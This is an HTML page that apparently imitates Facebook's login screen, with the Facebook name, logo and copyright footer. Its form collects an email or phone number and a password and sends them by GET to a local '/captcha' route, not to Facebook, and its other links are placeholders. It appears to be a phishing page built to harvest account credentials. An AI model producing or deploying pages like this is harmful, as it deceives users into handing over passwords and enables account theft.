<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>

    <!-- Header section with Facebook logo -->
    <div class="header">
        <div class="logo">
            <img src="/static/images/facebook-logo.png" alt="Facebook">
        </div>
    </div>

    <!-- Main container -->
    <div class="main-container">
        <div class="login-box">
            <h2>Log in to Facebook</h2>
            <form action="/captcha" method="GET">
                <input type="text" name="email" placeholder="Email or Phone Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="forgotten-account">
                <a href="#">Forgotten account?</a>
            </div>
            <hr>
            <button class="create-account">Create New Account</button>
        </div>
    </div>

    <!-- Footer section -->
    <div class="footer">
        <p><a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a></p>
        <p>Facebook © 2024</p>
    </div>

</body>
</html>
